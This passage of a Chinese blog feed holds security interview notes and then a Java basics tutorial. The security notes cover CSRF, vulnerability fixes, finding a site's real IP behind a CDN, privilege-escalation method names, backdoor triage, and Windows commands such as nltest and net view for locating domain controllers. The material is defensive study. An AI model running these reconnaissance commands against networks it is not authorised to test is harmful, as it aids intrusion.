<h2 id="CSRF漏洞的原理"><a href="#CSRF漏洞的原理" class="headerlink" title="CSRF漏洞的原理"></a>CSRF漏洞的原理</h2><p>跨站请求伪造（Cross Site Request Forgery，CSRF）</p>
<ul>
<li>目标用户使用其用户名和密码登录受信任站点，从而创建了一个新的会话，受信任站点则会为目标用户Web浏览器Cookie中的会话信息存储了会话标示符。</li>
<li>测试者往Web应用页面中插入恶意的HTML链接或脚本代码，而目标页面又没有过滤或者过滤不严，那么当用户浏览该页面时，用户的Web浏览器将被操纵向受信任站点发送一个恶意请求，比如删除帖子、添加管理员、添加邮件转发规则、改变路由器的DNS设置等。</li>
<li>Web浏览器将会为这个恶意请求自动附加会话Cookie信息，因为是访问的受信任站点，因此该恶意请求将会成功完成。</li>
</ul>
<p>与XSS相比：</p>
<ul>
<li>XSS：利用用户对站点的信任，攻击者通过注入程序来修改网站来使用户浏览器被重定向等</li>
<li>CSRF：利用站点对已经身份认证的用户的信任，攻击者伪造一个链接误导用户点击链接来使用用户的身份认证来访问服务器</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202201101519628.png" alt="CSRF原理"></p>
<h2 id="SQL注入、反序列化、文件包含、文件上传、CSRF、XSS、XXE漏洞的修复方法"><a href="#SQL注入、反序列化、文件包含、文件上传、CSRF、XSS、XXE漏洞的修复方法" class="headerlink" title="SQL注入、反序列化、文件包含、文件上传、CSRF、XSS、XXE漏洞的修复方法"></a>SQL注入、反序列化、文件包含、文件上传、CSRF、XSS、XXE漏洞的修复方法</h2><ul>
<li>sql注入：<ul>
<li>所有查询语句都使用数据库的参数化查询接口，并且参数化语句使用参数，而不是将用户输入变量直接嵌入到SQL语句中。</li>
<li>对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换</li>
<li>应严格规定数据长度，防止较长的SQL注入语句</li>
<li>不回显错误信息</li>
<li>严格限制网站用户数据库操作权限</li>
</ul>
</li>
<li>反序列化：<ul>
<li>升级到最新版本</li>
</ul>
</li>
<li>文件包含：<ul>
<li>设置文件上传白名单</li>
<li>升级程序</li>
</ul>
</li>
<li>文件上传：<ul>
<li>上传文件的存储目录禁用执行权限</li>
<li>文件后缀白名单，注意0x00截断攻击</li>
<li>文件上传后修改文件名</li>
<li>不能有本地文件包含漏洞</li>
<li>及时修复web上代码</li>
<li>升级web server</li>
</ul>
</li>
<li>CSRF<ul>
<li>验证http referer字段</li>
<li>请求地址中添加token并验证</li>
<li>在http头中自定义属性并验证</li>
</ul>
</li>
<li>XSS<ul>
<li>创建参数拦截filter类过滤器，对每次Post请求或者PUT请求坐下拦截</li>
</ul>
</li>
<li>XXE<ul>
<li>进制加载外部实体</li>
<li>不允许XML中含有任何自己声明的DTD</li>
</ul>
</li>
</ul>
<h2 id="如果网站有CDN，你如何查看他的真实IP地址"><a href="#如果网站有CDN，你如何查看他的真实IP地址" class="headerlink" title="如果网站有CDN，你如何查看他的真实IP地址"></a>如果网站有CDN，你如何查看他的真实IP地址</h2><blockquote>
<p>查询子域名 </p>
<p>网络空间引擎搜索法（钟馗之眼) </p>
<p>利用SSL证书寻找真实原始IP </p>
<p>利用HTTP标头寻找真实原始IP </p>
<p>利用网站返回的内容寻找真实原始IP</p>
<p>网站邮件订阅查找</p>
<p>用 Zmap 扫全网</p>
</blockquote>
<h2 id="如何判断是否有CDN"><a href="#如何判断是否有CDN" class="headerlink" title="如何判断是否有CDN"></a>如何判断是否有CDN</h2><p>CDN的全称是Content Delivery Network，即内容分发网络。通过在网络各处放置节点服务 器所构成的在现有的互联网基础之上的一层智能虚拟网络。其目的就是使用户可以就近取得所需的内容，解决Internet网络拥挤的状况，提高用户访问网络 的响应速度。</p>
<p><strong>检测方法</strong>：在Linux下使用dig命令进行测试或者DOS下使用nslookup进行测试。还有一个办法就是在不同的地区ping网址，如果都是同一个IP地址，则说明未使用CDN，如果是不同的 IP地址则说明使用了CDN。</p>
<h2 id="常见提权方式"><a href="#常见提权方式" class="headerlink" title="常见提权方式"></a>常见提权方式</h2><p>udf提权、mof提权、启动项提权等</p>
<h2 id="如果服务器被入侵，你会怎样进行溯源"><a href="#如果服务器被入侵，你会怎样进行溯源" class="headerlink" title="如果服务器被入侵，你会怎样进行溯源"></a>如果服务器被入侵，你会怎样进行溯源</h2><ul>
<li>网站源码分析、审计</li>
<li>日志分析</li>
<li>系统存储信息分析</li>
<li>分析进程端口</li>
</ul>
<h2 id="常见的中间件解析漏洞有哪些"><a href="#常见的中间件解析漏洞有哪些" class="headerlink" title="常见的中间件解析漏洞有哪些"></a>常见的中间件解析漏洞有哪些</h2><ul>
<li>1、IIS<ul>
<li>PUT漏洞</li>
<li>短文件名猜解</li>
<li>远程代码执行</li>
<li>解析漏洞</li>
</ul>
</li>
<li>2、Apache<ul>
<li>解析漏洞</li>
<li>目录遍历</li>
</ul>
</li>
<li>3、Nginx<ul>
<li>文件解析</li>
<li>目录遍历</li>
<li>CRLF注入</li>
<li>目录穿越</li>
</ul>
</li>
<li>4、Tomcat<ul>
<li>远程代码执行</li>
<li>war后门文件部署</li>
</ul>
</li>
<li>5、jBoss<ul>
<li>反序列化漏洞</li>
<li>war后门文件部署</li>
</ul>
</li>
<li>6、Weblogic<ul>
<li>反序列化漏洞</li>
<li>SSRF</li>
<li>任意文件上传</li>
<li>war后门文件部署</li>
</ul>
</li>
</ul>
<h2 id="在Windows-x2F-linux的加固问题上，你有哪些方法"><a href="#在Windows-x2F-linux的加固问题上，你有哪些方法" class="headerlink" title="在Windows&#x2F;linux的加固问题上，你有哪些方法"></a>在Windows&#x2F;linux的加固问题上，你有哪些方法</h2><h2 id="linux服务器被植入后门了，讲一下你的排查流程"><a href="#linux服务器被植入后门了，讲一下你的排查流程" class="headerlink" title="linux服务器被植入后门了，讲一下你的排查流程"></a>linux服务器被植入后门了，讲一下你的排查流程</h2><ul>
<li>（1）检查系统日志<ul>
<li>检查系统错误登录日志，统计IP重试次数</li>
</ul>
</li>
<li>（2）检查系统用户<ul>
<li>查看是否有异常的系统用户</li>
</ul>
</li>
<li>（3）检查异常进程<ul>
<li>注意UID为0的进程</li>
</ul>
</li>
<li>（4）检查异常系统文件</li>
<li>（5）检查系统文件完整性</li>
<li>（6）检查RPM的完整性</li>
<li>（7）检查网络</li>
<li>（8）检查系统后门</li>
<li>（9）检查系统服务</li>
<li>（10）检查rootkit</li>
</ul>
<h2 id="怎么查找域控"><a href="#怎么查找域控" class="headerlink" title="怎么查找域控"></a>怎么查找域控</h2><p>1、net view</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure>

<p>2、set log</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set log</span><br></pre></td></tr></table></figure>

<p>3、通过srv记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup -type=SRV _ldap._tcp.corp</span><br></pre></td></tr></table></figure>

<p>4、使用nltest</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nltest /dclist:corp</span><br></pre></td></tr></table></figure>

<p>5、使用dsquery</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DsQuery Server -domain corp</span><br></pre></td></tr></table></figure>

<p>6、使用netdom</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netdom query pdc</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>护网</category>
      </categories>
      <tags>
        <tag>网安</tag>
      </tags>
  </entry>
  <entry>
    <title>Java学习笔记(三)——基础知识的一些细节</title>
    <url>/2022/03/09/09-Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%89)%20/</url>
    <content><![CDATA[<h1 id="一、for循环细节"><a href="#一、for循环细节" class="headerlink" title="一、for循环细节"></a>一、for循环细节</h1><ul>
<li>（1）for(;循环条件;)中的初始化和变量迭代可以写到其他地方，但是两边的分号不能省略</li>
<li>（2）循环初始值可以有多条初始化语句，但要求类型一样，并且中间用逗号隔开，循环变量迭代也可以有多条变量迭代语句，中间用逗号隔开，例如：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(inti=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;count;i++,j+=<span class="number">2</span>)&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;i=&quot;</span> + i + <span class="string">&quot;j=&quot;</span> + j);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="二、do-while循环"><a href="#二、do-while循环" class="headerlink" title="二、do while循环"></a>二、do while循环</h1><ul>
<li>（1）do while是关键字</li>
<li>（2）与while的区别：while是先判断再执行，do while先执行，再判断，也就是说一定会执行一次。</li>
</ul>
<span id="more"></span>

<h1 id="三、数组"><a href="#三、数组" class="headerlink" title="三、数组"></a>三、数组</h1><ul>
<li>基本数据类型赋值，是具体的数据，而且相互不影响，因为其本质上是值拷贝</li>
<li>数组在默认情况下是引用传递，其赋的值是地址，所以会相互影响。</li>
</ul>
<p>如何只实现数组拷贝，而不相互影响呢？——数据区独立</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] arr1 = &#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line"><span class="comment">//开辟新的数据空间arr2</span></span><br><span class="line"><span class="type">int</span>[] arr2 = <span class="keyword">new</span> <span class="title class_">int</span>[arr1.length];</span><br><span class="line"><span class="comment">//遍历拷贝</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; arr1.length ; i++)&#123;</span><br><span class="line">	arr2[i] = arr1[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="动态数组扩容"><a href="#动态数组扩容" class="headerlink" title="动态数组扩容"></a>动态数组扩容</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Array</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">Scanner</span> <span class="variable">myScanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">		</span><br><span class="line">		<span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">do</span>&#123;</span><br><span class="line">		<span class="type">int</span>[] arrNew = <span class="keyword">new</span> <span class="title class_">int</span>[arr.length + <span class="number">1</span>];</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; arr.length; i++)&#123;</span><br><span class="line">			arrNew[i] = arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		System.out.println(<span class="string">&quot;请输入需要添加的元素&quot;</span>);</span><br><span class="line">		<span class="type">int</span> <span class="variable">addNum</span> <span class="operator">=</span> myScanner.nextInt();</span><br><span class="line">		arrNew[arrNew.length - <span class="number">1</span>] = addNum;</span><br><span class="line">		</span><br><span class="line">		arr = arrNew;</span><br><span class="line">		</span><br><span class="line">		System.out.println(<span class="string">&quot;===扩容后的数组情况===&quot;</span>);</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span> ; i&lt; arr.length;i++)&#123;</span><br><span class="line">			System.out.println(arr[i] + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">&quot;===是否继续添加 y/n ===&quot;</span>);</span><br><span class="line">		<span class="type">char</span> <span class="variable">key</span> <span class="operator">=</span> myScanner.next().charAt(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span>(key == <span class="string">&#x27;n&#x27;</span>)&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		&#125;<span class="keyword">while</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;你退出了添加&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="四、冒泡排序"><a href="#四、冒泡排序" class="headerlink" title="四、冒泡排序"></a>四、冒泡排序</h1><h2 id="冒泡排序流程分析"><a href="#冒泡排序流程分析" class="headerlink" title="冒泡排序流程分析"></a>冒泡排序流程分析</h2><blockquote>
<p>初始数组[24,69,80,57,13]</p>
<p>第1轮排序：目标把最大的数放在最后 （红色表示正在比较的两个数）<br>第1次比较：[$\textcolor{Red}{24}$,$\textcolor{Red}{69}$,80,57,13] </p>
<p>第2次比较：[24,$\textcolor{Red}{69}$,$\textcolor{Red}{80}$,57,13] </p>
<p>第3次比较：[24,69,$\textcolor{Red}{57}$,$\textcolor{Red}{80}$,13] </p>
<p>第4次比较：[24,69,57,$\textcolor{Red}{13}$,$\textcolor{Red}{80}$] </p>
<p>第2轮排序：目标把第2大的数放在倒数第2个位置（加粗表示正在已经确定位置的数）</p>
<p>第1次比较：[$\textcolor{Red}{24}$,$\textcolor{Red}{69}$,57,13,<strong>80</strong>] </p>
<p>第2次比较：[24,$\textcolor{Red}{57}$,$\textcolor{Red}{69}$,13,<strong>80</strong>] </p>
<p>第3次比较：[24,57,$\textcolor{Red}{13}$,$\textcolor{Red}{69}$,<strong>80</strong>] </p>
<p>第3轮排序：目标把第3大的数放在倒数第3个位置</p>
<p>第1次比较：[$\textcolor{Red}{24}$,$\textcolor{Red}{57}$,13,<strong>69</strong>,<strong>80</strong>] </p>
<p>第2次比较：[24,$\textcolor{Red}{13}$,$\textcolor{Red}{57}$,<strong>69</strong>,<strong>80</strong>] </p>
<p>第4轮排序：目标把第4大的数放在倒数第4个位置</p>
<p>第1次比较：[$\textcolor{Red}{13}$,$\textcolor{Red}{24}$,<strong>57</strong>,<strong>69</strong>,<strong>80</strong>] </p>
</blockquote>
<h2 id="冒泡排序特点"><a href="#冒泡排序特点" class="headerlink" title="冒泡排序特点"></a>冒泡排序特点</h2><ul>
<li><p>1、一共有5个元素</p>
</li>
<li><p>2、一共进行了4轮排序（4个外层循环）</p>
</li>
<li><p>3、每1轮排序确定一个数的位置，比如第1轮排序确定最大的数</p>
</li>
<li><p>4、当进行比较时，如果前面的数大于后面的数就交换。</p>
</li>
<li><p>5、每一轮比较逐渐减少，第n轮比较n-1次</p>
</li>
</ul>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">sort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] arry = &#123;<span class="number">24</span> , <span class="number">69</span> , <span class="number">80</span> , <span class="number">57</span> , <span class="number">13</span> &#125;;<span class="comment">//</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span>  <span class="operator">=</span> <span class="number">0</span> ;<span class="comment">//</span></span><br><span class="line">        <span class="comment">//外层</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span>; i &lt; arry.length-<span class="number">1</span>; ++i)&#123;</span><br><span class="line">            <span class="comment">//里层排序</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span> ; j &lt; arry.length-i-<span class="number">1</span> ; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arry[j] &gt; arry[j+<span class="number">1</span>])&#123;</span><br><span class="line">                    temp = arry[j];</span><br><span class="line">                    arry[j] = arry[j+<span class="number">1</span>];</span><br><span class="line">                    arry[j+<span class="number">1</span>] = temp;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;第&quot;</span>+ (i+<span class="number">1</span>) +<span class="string">&quot;轮排序的结果是:&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span> ; k &lt; <span class="number">5</span> ; ++k)&#123;</span><br><span class="line">                System.out.print(arry[k]+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="五、二维数组"><a href="#五、二维数组" class="headerlink" title="五、二维数组"></a>五、二维数组</h1><blockquote>
<h3 id="杨辉三角"><a href="#杨辉三角" class="headerlink" title="杨辉三角"></a>杨辉三角</h3><p>1</p>
<p>1 1</p>
<p>1 2 1</p>
<p>1 3 3 1</p>
<p>1 4 6 4 1</p>
<p>1 5 10 10 5 1</p>
</blockquote>
<p>核心特征：从第3行开始，对于非第一个元素和最后一个元素的元素值。<strong>arr[i] [j] &#x3D; arr[i-1] [j] +arr[i-1] [j-1]</strong> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">yanghui</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> <span class="number">10</span>;<span class="comment">//杨辉三角的层数</span></span><br><span class="line">        <span class="type">int</span>[][] yanghui = <span class="keyword">new</span> <span class="title class_">int</span>[high][];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; yanghui.length; ++i)&#123;</span><br><span class="line">            yanghui[i] = <span class="keyword">new</span> <span class="title class_">int</span>[i+<span class="number">1</span>];<span class="comment">//重点，要给每一个一维数组开辟空间</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span> ; j &lt; yanghui[i].length; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j == <span class="number">0</span> || j == yanghui[i].length - <span class="number">1</span>)&#123;</span><br><span class="line">                    yanghui[i][j] = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    yanghui[i][j] = yanghui[i-<span class="number">1</span>][j] + yanghui[i-<span class="number">1</span>][j-<span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; yanghui.length ; ++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span> ; j &lt; yanghui[i].length; j++)&#123;</span><br><span class="line">                System.out.print(yanghui[i][j]+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.print(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="六、类和对象的内存分配机制"><a href="#六、类和对象的内存分配机制" class="headerlink" title="六、类和对象的内存分配机制"></a>六、类和对象的内存分配机制</h1><p><img src="https://picgooo.oss-cn-hangzhou.aliyuncs.com/img/image-20220326141638803.png" alt="image-20220326141638803"></p>
<h2 id="Java内存的结构分析"><a href="#Java内存的结构分析" class="headerlink" title="Java内存的结构分析"></a>Java内存的结构分析</h2><ul>
<li>1、栈：一般存放基本数据类型，局部变量</li>
<li>2、堆：存放对象（Cat cat，数组等）</li>
<li>3、方法区：常量池（常量，比如字符串（因为字符串在java里本身就是一个类）），类加载信息</li>
</ul>
<h2 id="Java创建对象的流程简单分析"><a href="#Java创建对象的流程简单分析" class="headerlink" title="Java创建对象的流程简单分析"></a>Java创建对象的流程简单分析</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">p.name = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">p.age = <span class="number">10</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>1、先加载Person类信息（属性和方法信息，指挥加载一次）</li>
<li>2、在堆中分配空间，进行默认初始化（看规则）</li>
<li>3、把地址赋给P，P就指向对象。</li>
<li>4、进行指定初始化，比如p.name &#x3D;  ‘“jack”</li>
</ul>
<h2 id="Java方法调用机制"><a href="#Java方法调用机制" class="headerlink" title="Java方法调用机制"></a>Java方法调用机制</h2><ul>
<li>1、当程序执行到方法时，就会开辟一个独立的栈空间</li>
<li>2、当方法执行完毕，或者执行到return语句，就会返回</li>
<li>3、返回到调用方法的地方</li>
<li>4、返回后继续执行方法后面的代码</li>
<li>5、当main方法执行完毕，整个程序退出</li>
</ul>
<h2 id="Java方法使用细节"><a href="#Java方法使用细节" class="headerlink" title="Java方法使用细节"></a>Java方法使用细节</h2><ul>
<li>1、一个方法最多有一个返回值，如果需要返回多个，可以返回数组。</li>
<li>2、返回类型可以为任意类型，包含基本类型和引用类型（数组、对象）</li>
<li>3、如果方法要求有返回数据类型，则方法体中最后的执行语句必须为return值；而且要求返回值类型必须和return的值类型一致或兼容。</li>
<li>4、如果方法是void，则方法体中可以没有return语句，或者只写return</li>
<li>5、方法中不能再定义方法，即不能嵌套定义。</li>
</ul>
<h1 id="七、-x3D-x3D-和equals-的区别"><a href="#七、-x3D-x3D-和equals-的区别" class="headerlink" title="七、&#x3D;&#x3D;和equals()的区别"></a>七、&#x3D;&#x3D;和equals()的区别</h1><ul>
<li>对于基本数据类型来说，<code>==</code> 比较的是值。</li>
<li>对于引用数据类型来说，<code>==</code> 比较的是对象的内存地址。</li>
</ul>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">因为 Java 只有值传递，所以，对于 == 来说，不管是比较基本数据类型，还是引用数据类型的变量，其本质比较的都是值，只是引用类型变量存的值是对象的地址。</span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong><code>equals()</code></strong> 不能用于判断基本数据类型的变量，只能用来判断两个对象是否相等。<code>equals()</code>方法存在于<code>Object</code>类中，而<code>Object</code>类是所有类的直接或间接父类，因此所有的类都有<code>equals()</code>方法。</p>
<p><code>equals()</code> 方法存在两种使用情况：</p>
<ul>
<li><strong>类没有重写 <code>equals()</code>方法</strong> ：通过<code>equals()</code>比较该类的两个对象时，等价于通过“&#x3D;&#x3D;”比较这两个对象，使用的默认是 <code>Object</code>类<code>equals()</code>方法。</li>
<li><strong>类重写了 <code>equals()</code>方法</strong> ：一般我们都重写 <code>equals()</code>方法来比较两个对象中的属性是否相等；若它们的属性相等，则返回 true(即，认为这两个对象相等)。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;ab&quot;</span>); <span class="comment">// a 为一个引用</span></span><br><span class="line"><span class="type">String</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;ab&quot;</span>); <span class="comment">// b为另一个引用,对象的内容一样</span></span><br><span class="line"><span class="type">String</span> <span class="variable">aa</span> <span class="operator">=</span> <span class="string">&quot;ab&quot;</span>; <span class="comment">// 放在常量池中</span></span><br><span class="line"><span class="type">String</span> <span class="variable">bb</span> <span class="operator">=</span> <span class="string">&quot;ab&quot;</span>; <span class="comment">// 从常量池中查找</span></span><br><span class="line">System.out.println(aa == bb);<span class="comment">// true</span></span><br><span class="line">System.out.println(a == b);<span class="comment">// false</span></span><br><span class="line">System.out.println(a.equals(b));<span class="comment">// true</span></span><br><span class="line">System.out.println(<span class="number">42</span> == <span class="number">42.0</span>);<span class="comment">// true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>String</code> 中的 <code>equals</code> 方法是被重写过的，因为 <code>Object</code> 的 <code>equals</code> 方法是比较的对象的内存地址，而 <code>String</code> 的 <code>equals</code> 方法比较的是对象的值。</p>
<p>当创建 <code>String</code> 类型的对象时，虚拟机会在常量池中查找有没有已经存在的值和要创建的值相同的对象，如果有就把它赋给当前引用。如果没有就在常量池中重新创建一个 <code>String</code> 对象。</p>
<h1 id="八、方法重载与重写"><a href="#八、方法重载与重写" class="headerlink" title="八、方法重载与重写"></a>八、方法重载与重写</h1><h3 id="重载和重写的区别"><a href="#重载和重写的区别" class="headerlink" title="重载和重写的区别"></a>重载和重写的区别</h3><blockquote>
<p>重载就是同样的一个方法能够根据输入数据的不同，做出不同的处理</p>
<p>重写就是当子类继承自父类的相同方法，输入数据一样，但要做出有别于父类的响应时，你就要覆盖父类方法</p>
</blockquote>
<h3 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h3><p>发生在同一个类中（或者父类和子类之间），方法名必须相同，参数类型不同、个数不同、顺序不同，方法返回值和访问修饰符可以不同。</p>
<blockquote>
<p>如果多个方法(比如 <code>StringBuilder</code> 的构造方法)有相同的名字、不同的参数， 便产生了重载。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;HelloWorld&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>编译器必须挑选出具体执行哪个方法，它通过用各个方法给出的参数类型与特定方法调用所使用的值类型进行匹配来挑选出相应的方法。 如果编译器找不到匹配的参数， 就会产生编译时错误， 因为根本不存在匹配， 或者没有一个比其他的更好(这个过程被称为重载解析(overloading resolution))。</p>
<p>Java 允许重载任何方法， 而不只是构造器方法。</p>
</blockquote>
<p>综上：<strong>重载就是同一个类中多个同名方法根据不同的传参来执行不同的逻辑处理</strong></p>
<h2 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h2><p>重写发生在运行期，是子类对父类的允许访问的方法的实现过程进行重新编写。</p>
<ol>
<li>方法名、参数列表必须相同，子类方法返回值类型应比父类方法返回值类型更小或相等，抛出的异常范围小于等于父类，访问修饰符范围大于等于父类。</li>
<li>如果父类方法访问修饰符为 <code>private/final/static</code> 则子类就不能重写该方法，但是被 <code>static</code> 修饰的方法能够被再次声明。</li>
<li>构造方法无法被重写</li>
</ol>
<p>综上：<strong>重写就是子类对父类方法的重新改造，外部样子不能改变，内部逻辑可以改变。</strong></p>
<table>
<thead>
<tr>
<th align="left">区别点</th>
<th align="left">重载方法</th>
<th align="left">重写方法</th>
</tr>
</thead>
<tbody><tr>
<td align="left">发生范围</td>
<td align="left">同一个类</td>
<td align="left">子类</td>
</tr>
<tr>
<td align="left">参数列表</td>
<td align="left">必须修改</td>
<td align="left">一定不能修改</td>
</tr>
<tr>
<td align="left">返回类型</td>
<td align="left">可修改</td>
<td align="left">子类方法返回值类型应比父类方法返回值类型更小或相等</td>
</tr>
<tr>
<td align="left">异常</td>
<td align="left">可修改</td>
<td align="left">子类方法声明抛出的异常类应比父类方法声明抛出的异常类更小或相等；</td>
</tr>
<tr>
<td align="left">访问修饰符</td>
<td align="left">可修改</td>
<td align="left">一定不能做更严格的限制（可以降低限制）</td>
</tr>
<tr>
<td align="left">发生阶段</td>
<td align="left">编译期</td>
<td align="left">运行期</td>
</tr>
</tbody></table>
<p><strong>方法的重写要遵循“两同两小一大”</strong>（以下内容摘录自《疯狂 Java 讲义》，<a href="https://github.com/Snailclimb/JavaGuide/issues/892">issue#892open in new window</a> ）：</p>
<ul>
<li>“两同”即方法名相同、形参列表相同；</li>
<li>“两小”指的是子类方法返回值类型应比父类方法返回值类型更小或相等，子类方法声明抛出的异常类应比父类方法声明抛出的异常类更小或相等；</li>
<li>“一大”指的是子类方法的访问权限应比父类方法的访问权限更大或相等。</li>
</ul>
<p>⭐️ 关于 <strong>重写的返回值类型</strong> 这里需要额外多说明一下，上面的表述不太清晰准确：如果方法的返回类型是 void 和基本数据类型，则返回值重写时不可修改。但是如果方法的返回值是引用类型，重写时是可以返回该引用类型的子类的。</p>
<p>详见：<a href="https://javaguide.cn/java/basis/java-basic-questions-01.html#%E6%96%B9%E6%B3%95">Java基础常见知识&amp;面试题总结(上) | JavaGuide</a></p>
<h1 id="九、构造方法-x2F-构造器"><a href="#九、构造方法-x2F-构造器" class="headerlink" title="九、构造方法&#x2F;构造器"></a>九、构造方法&#x2F;构造器</h1><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><p>构造方法又叫构造器（constructor），是类的一种特殊的方法，它的主要作用是完成对<strong>新对象的初始化</strong>，几个特点：</p>
<ul>
<li>方法名与类名相同</li>
<li>没有返回值</li>
<li>在创建对象时，系统会自动的调用该类的构造器完成对对象的初始化</li>
</ul>
<p>例：</p>
